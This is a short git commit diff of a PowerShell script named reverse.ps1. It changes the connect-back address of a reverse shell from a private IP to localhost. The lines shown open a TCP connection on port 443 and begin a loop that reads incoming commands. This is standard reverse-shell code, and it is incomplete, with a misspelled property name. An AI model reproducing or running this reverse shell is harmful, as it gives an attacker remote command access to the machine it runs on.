66719ace15eceb7d2089fbb0822dea91d19a3e12
IArandom <76522240+IArandom@users.noreply.github.com>
2020-12-30 14:42:20 -0400

    Update reverse.ps1

--- reverse.ps1
+++ reverse.ps1
@@ -1,4 +1,4 @@
-$sm=(New-Object Net.Sockets.TCPClient('172.21.0.146', 443)).GetStream();
+$sm=(New-Object Net.Sockets.TCPClient('127.0.0.1', 443)).GetStream();
 [byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Lenght)) -ne 0){;
 $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
 $bypass = "ASCII"
